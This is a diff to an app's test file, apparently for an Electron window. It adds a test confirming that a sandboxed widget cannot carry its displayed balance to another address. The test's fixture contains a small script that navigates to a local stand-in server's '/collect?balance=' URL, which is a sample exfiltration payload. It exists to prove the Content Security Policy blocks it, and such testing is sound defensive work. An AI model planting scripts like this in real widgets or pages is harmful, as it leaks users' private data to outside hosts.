@@ -103,6 +103,9 @@ const open = async (id, then = '') => { await js(`__open(${id}); ${then}`); awai
 
 const tests = [];
 const test = (name, fn) => tests.push({ name, fn });
+// Console errors a test expects (the window's own policy refusing something, say): cleared
+// before each test; any other error on the page fails it.
+let expectedErrors = [];
 function assert(cond, message) { if (!cond) throw new Error(message); }
 
 // ── Space: a space where text goes, a press on a control, the microphone only on the page ──
@@ -3228,6 +3231,35 @@ test('A widget: on a card and the dashboard, sealed in its sandbox, pinned and t
   WIDGET_DOCS.clear();
 });
 
+// A widget whose script sends itself to another address, to carry what it shows there: a
+// sandboxed frame may still navigate itself. The window's own policy (index.html:
+// default-src 'self', so frames may only show the window's own address) stops it; a server of
+// the test's own on 127.0.0.1 stands in for someone else's, and counts what reaches it.
+test('A widget that tries to take its figures to another address goes nowhere', async () => {
+  const reached = [];
+  const elsewhere = http.createServer((req, res) => { reached.push(req.url); res.end('got it'); });
+  await new Promise((r) => elsewhere.listen(0, '127.0.0.1', r));
+  const away = `http://127.0.0.1:${elsewhere.address().port}/collect?balance=12345`;
+  const id = 'Leave-Abcdefghijklmnopq';
+  WIDGET_DOCS.set(`/f/widgets/${id}`, `<!doctype html><p>Balance: 12,345</p><script>setTimeout(() => { location.href = ${JSON.stringify(away)}; }, 30);</script>`);
+  expectedErrors = [/^Framing 'http:\/\/127\.0\.0\.1:\d+\/' violates the following Content Security Policy directive: "default-src 'self'"/];
+  const blocked = [];
+  const failed = (_e, code, _desc, url) => { if (url.startsWith(away)) blocked.push(code); };
+  win.webContents.on('did-fail-load', failed);
+  try {
+    await loadFeatures('widgets.js', 'widgets.css');
+    await js(`__ev(${JSON.stringify(HELLO)})`);
+    await js(`__ev(${JSON.stringify({ type: 'widget', rid: 'r1', id, title: 'Balance', url: `/f/widgets/${id}`, scripts: true, height: 120, made: '', pinned: false })})`);
+    for (let i = 0; i < 300 && !blocked.length && !reached.length; i++) await sleep(50);  // a busy Mac: up to 15 s
+    assert(reached.length === 0, `the widget reached another address: ${reached}`);
+    assert(blocked.length === 1, `the widget never tried, or wasn't stopped: ${blocked}`);
+  } finally {
+    win.webContents.off('did-fail-load', failed);
+    WIDGET_DOCS.clear();
+    elsewhere.close();
+  }
+});
+
 // ── Memory (features/memory.js): its rows and sheet, its cards, and "Do it" on an intent ──
 
 const MEM_FACTS = [
@@ -5679,10 +5711,11 @@ app.whenReady().then(async () => {
   win = new BrowserWindow({ show: false, width: 1280, height: 840, webPreferences: { backgroundThrottling: false, contextIsolation: true, sandbox: true } });
   win.webContents.debugger.attach('1.3');
   const errors = [];
-  win.webContents.on('console-message', (e) => { if (e.level === 'error' && !/Failed to load resource|WebSocket|ERR_NAME_NOT_RESOLVED|fonts\./.test(e.message)) errors.push(e.message); });
+  win.webContents.on('console-message', (e) => { if (e.level === 'error' && !/Failed to load resource|WebSocket|ERR_NAME_NOT_RESOLVED|fonts\./.test(e.message) && !expectedErrors.some((r) => r.test(e.message))) errors.push(e.message); });
   let failed = 0;
   for (const t of tests) {
     errors.length = 0;
+    expectedErrors = [];
     try {
       await fresh();
       await t.fn();
